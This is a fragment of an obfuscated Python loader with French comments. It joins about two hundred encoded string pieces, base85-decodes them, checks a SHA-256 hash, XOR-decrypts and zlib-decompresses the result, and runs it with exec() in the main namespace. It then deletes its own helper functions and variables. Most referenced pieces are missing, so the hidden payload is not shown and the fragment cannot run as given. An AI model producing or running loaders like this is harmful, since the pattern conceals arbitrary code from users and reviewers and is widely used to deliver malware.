_cy8hB1aj6U1KSc = '8?3!1N!z1S$P&n%}<YkEc4nSM<RUrUN@`QX!2^TZ&*mL2?`ZLW)q^$ULfR'
_cvMxo53B1BtFb2 = 'q<^FewZ1=?_|BxJ=x3LE$9g6K6JifQ04nczg$R'

_ptbKgUgcVH15xH = __import__('base64').b85decode(_cuuqxIUrB0qEA0 + _cmHYrtbocdqum0 + _cgc638DBirfrfw + _cwTQGENd5dEbtr + _cjbL8KElWtoOIc + _cuan02RXgBot7y + _cjbOq1RLrYHYjM + _cpWkQAwbPDzw11 + _cybtWekVixLOaY + _crmHjK7cQDNZdx + _chOyoQxKzUst_5 + _cq08rSYvvorga3 + _cvHBGZiLOruEua + _cdfevcVuiHfcYE + _ca4jrEbsTqMWWZ + _coZkDAhvEogOcV + _cwz2aKEOjBq76C + _clnEIm2VN_FLqs + _crNUbu03s3iqzu + _cxtcx2jwlodOfF + _cm04nIC8R5GuhS + _chmCs13PckNtQ4 + _coJKOroInBE4z5 + _cgW7Ejeq7u58zi + _cgpMG75k57LxLT + _caDpwCQFLpsYx7 + _cow6wSxOUMa0M7 + _cecbawPehBl0k4 + _chCpsazpNjMrJe + _cshx7ScSpGHGNq + _cror6EDARIFOPx + _cxcSQkue36vR2o + _chz1EUrOVUCuDz + _cw1sg4O8mpI075 + _cwJ2lI9X15Riac + _cvRB3oBE9B6spY + _cavtXMhHpZklZ9 + _cvLWjbOQXnOrkg + _cnanVmC4AGhNCG + _c_MuvXCVj_hdKU + _cdpkjp47ERe0PO + _ccDmvOE7YNl747 + _cxkrghvZ56kH59 + _cgKc0opkE4zSXw + _crltZortwITs3k + _cs3a7Qmwpw7q78 + _cjSUlUQNrQGc1u + _chGQhhCueX5472 + _ceBiJ0vWkT1TCi + _cx2S4I1KLDBDBR + _ceQAKRi3Qbu0hb + _ccE8kWcXXG_hKw + _ccXWtQZ3bIO219 + _ceLeefyD4ArH97 + _cxhYUJbX4h97e9 + _cxei6_7kDzxY9w + _cp71ka3YNB8wV9 + _cx6Nc9TLvafMUQ + _cguOK9fndF7szZ + _cx3ybmm_fZYVvO + _cjdrZHx_xwwINH + _cicPbCNRCxT7q2 + _cppFsTVzBFJSCY + _cgAHh_eqaOKkEU + _cogrlqiuBNPItG + _ctzT_wE2XO7K0b + _cuM2LZyuq7uL_o + _cpLY26E2JFL3ox + _cx2K796XjUgT8q + _cmcUJ3ZTpficky + _clF1PZmDVIQEIe + _chnmlxzK6FBGWG + _clWWh91IQnPUn0 + _clFoVX_xWilhQD + _cz3SEJVasj0ElK + _czJBVSFgKGsxYd + _cdbkKrIORnzcld + _cvX2NSUzPao7pL + _cunLBiDuJ7aKCw + _cd25_fGN4HRBCI + _ccj9IcRobZ3Ry2 + _cftDGM_u0LPeVI + _cxQIM1MmFdna35 + _czY513k6T1He1z + _cviiU0ziqlHt7u + _cvLesdWaVgpzQw + _cgan6yUXw0M5Qr + _cupeDU4O6nXL83 + _ciLI8GSo8RiqVJ + _cfgsH5mq9ge8nq + _coYC_LEp1_hQWb + _cn9cD6wXxTCJqr + _cmEoTWgcAsmc8R + _chnWjga8zb9sL6 + _ct0w2RysfJujJl + _ch4dssWuHFz6yj + _czYdgRDL89ngMt + _coFxfudJ6pGbm0 + _cnZKHl0DbtYBir + _cniUVr7W4wk_f1 + _cvESuljVjLKXsM + _chbeWGADZbdDcw + _cklynFGTIFkb2I + _cmx0OM5QgBv0lE + _cddr3ABhlGz7IZ + _chHM_UAF3Fy3dL + _ci9BODcwd3HC1L + _cz6g78T9_gwKkI + _cyI9OPpTfQrX0y + _cliZ1eAJC1rdag + _ca3cf0EBarkg1V + _caH9CZ_owczPZ1 + _cmd9eMw5Wk6gvY + _cuuKx0DPbvkYgF + _cfKQD9HB5b5d60 + _cuKdRwcVQe5k4N + _cjmbsTgcNyLzM6 + _chgBQ7HPG22400 + _ciZxUFtJmQfUSY + _ceQ5cTmjjtDpAJ + _cbyPG_pywOwQkp + _cwqbHbwKUFfV46 + _chCcFDSR4gWvsD + _ccxl4KvKpbpnKy + _cvHeeveNuqAjO7 + _csDRy0fEArOcbu + _cmmXs9V2x7Igq4 + _cf7plPdFl746s3 + _czMegk7uJDAh6y + _cdDzj2cnSCmYGq + _cor45PMAqwBthX + _ccHJucAXorhFlB + _ckdKGfavzvtYGy + _c_ZNAR6dLxm67r + _cytXbaWwE9nE1p + _cagV6pOwWK9zPQ + _cmthRUxueZCv0u + _cmrbQU7SmgpxvN + _ce5bcLPsiGrgmK + _cpfdNsqXeFRkMa + _cd_nPp8zGRVVYX + _cnP3PI8KLcOKYU + _cypExqvb84QIpd + _cnlavITvFzfWDS + _cjWGgBd0hdOeWd + _cjjSJopVA53DEt + _cj9MW26h9Qcuou + _ciojNmdAnUESwN + _csorX0qCq_RcQh + _ciHHYHyk89Pfa4 + _cqfG9C5yD_TAFv + _ch2hbOJos8Cso_ + _cf6iaXO92xeqtb + _cno9sjTTFQ6FKD + _ciNlRXGzKgUUj5 + _ca4OKs1M2ZlyZt + _crUDNUQihVVMPR + _cnH0nzjOlbsHL9 + _cbd7_u_gGDOrzK + _cw2NSUhIBEKcTZ + _cpCGi_1k63rNQu + _cwOH4KR0RfaZCa + _c_45nCRmL3hhQH + _cozfVER_dumJT7 + _chEsig5rMrbBUs + _cw1UrN_q21hlHX + _clusPQBUuWVvrL + _cu5VFZE5WogeDz + _cq4uYlMvEDqD8N + _cvf4q09JR81n9n + _cbfSA554S7B6Jg + _cwvs9X9o4hix5a + _cnDBrksSIvolFW + _ctHIRyR4jAqWaL + _ccTEXFVjgNb_Tw + _c_PV06RlgrhPq3 + _ctfT_wYiQ54TkR + _cy86Ov654iP079 + _cmWw5qRP3PXA1a + _cdg3TaK1P8abEF + _clgA8HrXCcbZbF + _cpJdtwSUDQcM5M + _cinxQs3PIUlXIR + _cr72fu92zzCunb + _ckM1tcFtMaSLh5 + _cluO1oLqRWFsUG + _clx7BI05X5x8Mh + _cum8kANzIPtIKy + _cy8hB1aj6U1KSc + _cvMxo53B1BtFb2)
if __import__('hashlib').sha256(_ptbKgUgcVH15xH).hexdigest() != 'c63e638899ebf491d6cec8ec49fc7e0d3f6df70364bc55c4450dd0e993d0f790':
    __import__('sys').exit(1)
_xauOxwWjyfMRJ8 = bytes([15, 26, 255, 165, 211, 168, 206, 155, 181])
_fkgTHsJDzemsAEs = bytes([87, 126, 67, 85, 197, 89, 27, 181, 198])

def _fxoYxoGeJCWEXdU(_brdp7kdBL7bhrQ, _kuMT29dN6khHp4):
    return bytes(_brdp7kdBL7bhrQ[_igptqmrNynEyCS] ^ _kuMT29dN6khHp4[_igptqmrNynEyCS % len(_kuMT29dN6khHp4)] for _igptqmrNynEyCS in range(len(_brdp7kdBL7bhrQ)))

def _fdzKh7fdRmwpiaL(_t_W01yHCkQiBRd):
    import zlib
    return zlib.decompress(_t_W01yHCkQiBRd) # Un seul niveau de zlib ici pour simplifier

def _fef1jjmA6hAJd30():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfr3xmSr8Moef_ = _fxoYxoGeJCWEXdU(_ptbKgUgcVH15xH, _xauOxwWjyfMRJ8)
    # 2. Décompression Zlib
    _dzwWvEDWyo6ksX = _fdzKh7fdRmwpiaL(_xfr3xmSr8Moef_)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dzwWvEDWyo6ksX.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nnbT91poscd28_ = _main.__dict__
    _nnbT91poscd28_.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nnbT91poscd28_)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fef1jjmA6hAJd30()
try:
    del _fxoYxoGeJCWEXdU, _fdzKh7fdRmwpiaL, _fef1jjmA6hAJd30
    del _ptbKgUgcVH15xH, _xauOxwWjyfMRJ8, _fkgTHsJDzemsAEs
except:
    pass
